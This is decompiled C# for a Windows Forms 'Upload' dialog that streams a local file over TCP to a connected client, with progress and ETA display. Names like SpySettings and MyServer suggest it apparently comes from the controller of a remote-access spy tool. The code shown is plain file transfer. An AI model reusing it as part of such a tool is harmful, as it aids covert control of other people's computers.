using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x020000C5 RID: 197
[DesignerGenerated]
public partial class Upload : Form
{
	// Token: 0x0600087F RID: 2175 RVA: 0x000C95DC File Offset: 0x000C77DC
	public Upload()
	{
		base.Load += this.Upload_Load;
		base.Closing += this.Upload_Closing;
		this.FileStream = null;
		this.Upstream = 0L;
		this._stream = 0L;
		this.Title = "null";
		this.InitializeComponent();
	}

	// Token: 0x06000882 RID: 2178 RVA: 0x0007EF60 File Offset: 0x0007D160
	private void SpyStyle()
	{
		foreach (DataGridView dataGridView in base.Controls.OfType<DataGridView>())
		{
			dataGridView.BackgroundColor = SpySettings.DefaultColor_Background;
			dataGridView.BackColor = SpySettings.DefaultColor_Background;
			dataGridView.ColumnHeadersDefaultCellStyle.BackColor = SpySettings.DefaultColor_Background;
			dataGridView.DefaultCellStyle.BackColor = SpySettings.DefaultColor_Background;
			dataGridView.DefaultCellStyle.SelectionForeColor = SpySettings.DefaultColor_Background;
			dataGridView.DefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground;
			dataGridView.DefaultCellStyle.SelectionBackColor = SpySettings.DefaultColor_Foreground;
			dataGridView.ColumnHeadersDefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground;
		}
	}

	// Token: 0x06000883 RID: 2179 RVA: 0x000C9B04 File Offset: 0x000C7D04
	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			this.TOpacity.Enabled = false;
		}
	}

	// Token: 0x06000884 RID: 2180 RVA: 0x000C9B4C File Offset: 0x000C7D4C
	private void Upload_Load(object sender, EventArgs e)
	{
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\16.ico");
		this.SpyStyle();
		this.DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f;
		this.DGV0.DefaultCellStyle.Font = reso.f;
		this.TimeFinish.Interval = 100;
		this.TimeFinish.Enabled = true;
		if (this.FileStream == null & this.Upstream == 0L)
		{
			this.FileStream = new FileStream(this.SPL[3], FileMode.Open, FileAccess.Read);
		}
		if (this.Bgworker == null)
		{
			this.Bgworker = new BackgroundWorker();
		}
		if (!this.Bgworker.IsBusy)
		{
			this.Bgworker.RunWorkerAsync();
		}
		else
		{
			if (this.FileStream != null)
			{
				this.FileStream.Dispose();
				this.FileStream.Close();
			}
			this.classClient.Close(this.Client);
			base.Close();
		}
		this.Progr.Interval = 10;
		this.Progr.Enabled = true;
		this.Text = this.Title;
		this.TOpacity.Interval = SpySettings.T_Interval;
		this.TOpacity.Enabled = true;
	}

	// Token: 0x06000885 RID: 2181 RVA: 0x000C9C9C File Offset: 0x000C7E9C
	private void worker_DoWork(object sender, DoWorkEventArgs e)
	{
		byte[] array = new byte[4097];
		if (this.FileStream != null)
		{
			int num;
			do
			{
				num = this.FileStream.Read(array, 0, array.Length);
				if (num > 0)
				{
					checked
					{
						try
						{
							if (this.Client.Client.Connected)
							{
								this.Client.Client.Poll(infoServer.Microseconds, SelectMode.SelectWrite);
								this.Client.Client.SendBufferSize = array.Length;
								this.Client.GetStream().Write(array, 0, num);
								this._stream += unchecked((long)num);
								this.Upstream += unchecked((long)array.Length);
								this.classClient.MyServer.BytesSent += unchecked((long)array.Length);
							}
						}
						catch (Exception)
						{
							break;
						}
					}
					if (this.Upstream == (long)Conversions.ToInteger(this.SPL[1]))
					{
						break;
					}
				}
				Thread.Sleep(1);
			}
			while (num > 0);
		}
		if (this.FileStream != null)
		{
			this.FileStream.Dispose();
			this.FileStream.Close();
		}
	}

	// Token: 0x06000886 RID: 2182 RVA: 0x000C9DD8 File Offset: 0x000C7FD8
	private void Upload_Closing(object sender, CancelEventArgs e)
	{
		this.TimeFinish.Enabled = false;
		this.Progr.Enabled = false;
		if (this.classClient != null)
		{
			this.classClient.qit = true;
			this.classClient.Close(this.Client);
		}
		if (this.FileStream != null)
		{
			this.FileStream.Dispose();
			this.FileStream.Close();
		}
		if (this.Bgworker != null)
		{
			try
			{
				this.Bgworker.Dispose();
				this.Bgworker.CancelAsync();
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000887 RID: 2183 RVA: 0x000C9E7C File Offset: 0x000C807C
	private void TimeFinish_Tick(object sender, EventArgs e)
	{
		if (this.DGV0.Rows.Count > 0)
		{
			if (this._stream < this.TotalSize)
			{
				if (this._stream > 0L)
				{
					this.stop_time = DateAndTime.Now;
					this.elapsed_time = this.stop_time.Subtract(this.start_time);
					long value = checked((long)Math.Round(unchecked((double)(checked(this.TotalSize - this._stream)) * this.elapsed_time.TotalSeconds) / (double)this._stream));
					string text = Codes.ToTime(value);
					if (!text.Equals("0:0:0"))
					{
						DateTime dateTime = DateTime.Now;
						DateTime dateTime2 = Convert.ToDateTime(text);
						dateTime = dateTime.AddHours((double)dateTime2.Hour).AddMinutes((double)dateTime2.Minute).AddSeconds((double)dateTime2.Second);
						this.DGV0.Rows[4].Cells[1].Value = string.Format("[{0}] [{1}]", text, dateTime.ToString("h:mm:ss"));
					}
				}
			}
			else
			{
				base.Close();
			}
		}
	}

	// Token: 0x06000888 RID: 2184 RVA: 0x000C9FC8 File Offset: 0x000C81C8
	private void Progr_Tick(object sender, EventArgs e)
	{
		if (this._stream != 0L | this._stream > (long)this.ProgressBar1.Maximum)
		{
			this.ProgressBar1.Value = checked((int)this._stream);
		}
	}

	// Token: 0x04000CA8 RID: 3240
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TimeFinish")]
	private System.Windows.Forms.Timer _TimeFinish;

	// Token: 0x04000CA9 RID: 3241
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Progr")]
	private System.Windows.Forms.Timer _Progr;

	// Token: 0x04000CAA RID: 3242
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private System.Windows.Forms.Timer _TOpacity;

	// Token: 0x04000CAB RID: 3243
	public TcpClient Client;

	// Token: 0x04000CAC RID: 3244
	public Client classClient;

	// Token: 0x04000CAD RID: 3245
	public FileStream FileStream;

	// Token: 0x04000CAE RID: 3246
	public long Upstream;

	// Token: 0x04000CAF RID: 3247
	public long _stream;

	// Token: 0x04000CB0 RID: 3248
	public long TotalSize;

	// Token: 0x04000CB1 RID: 3249
	public TimeSpan elapsed_time;

	// Token: 0x04000CB2 RID: 3250
	public DateTime start_time;

	// Token: 0x04000CB3 RID: 3251
	public DateTime stop_time;

	// Token: 0x04000CB4 RID: 3252
	public string[] SPL;

	// Token: 0x04000CB5 RID: 3253
	public string Title;

	// Token: 0x04000CB6 RID: 3254
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Bgworker")]
	private BackgroundWorker _Bgworker;

	// Token: 0x04000CBE RID: 3262
	internal BackgroundWorker Bgworker;
}
